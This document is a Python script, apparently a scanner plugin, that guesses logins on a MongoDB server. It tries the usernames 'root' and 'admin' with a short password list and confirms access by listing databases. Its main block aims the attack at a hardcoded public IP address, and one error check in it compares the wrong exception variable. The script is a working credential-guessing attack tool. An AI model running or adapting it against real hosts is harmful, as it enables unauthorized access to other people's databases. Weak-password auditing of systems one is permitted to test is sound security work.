from pymongo import MongoClient


def do(target):
    port = 27017
    time_out_flag = 0
    for user in ['root', 'admin']:
        for pwd in ['asdada', 'asdasda', 'asdada', 'asdaa']:
            try:
                if time_out_flag > 2:
                    print('connection timeout , break the loop .')
                    return False, ''
                conn = MongoClient(host='mongodb://' + target + ':' + str(port), username=user, password=pwd, serverSelectionTimeoutMS=5)
                conn.list_databases()
                return True, ("弱口令: %s, %s" % (user, pwd))
            except Exception as e:
                if 'No servers found yet' in str(e) or 'Connection refused' in str(e):
                    time_out_flag += 1
                try:
                    conn = MongoClient(host='mongodb://' + target + ':' + str(port) + '/' + user, username=user, password=pwd, serverSelectionTimeoutMS=5)
                    conn.list_databases()
                    return True, ("弱口令: %s, %s" % (user, pwd))
                except Exception as _e:
                    if 'No servers found yet' in str(_e) or 'Connection refused' in str(e):
                        time_out_flag += 1
                    print(_e)
    return False, ''

if __name__ == '__main__':
    do('101.36.153.223')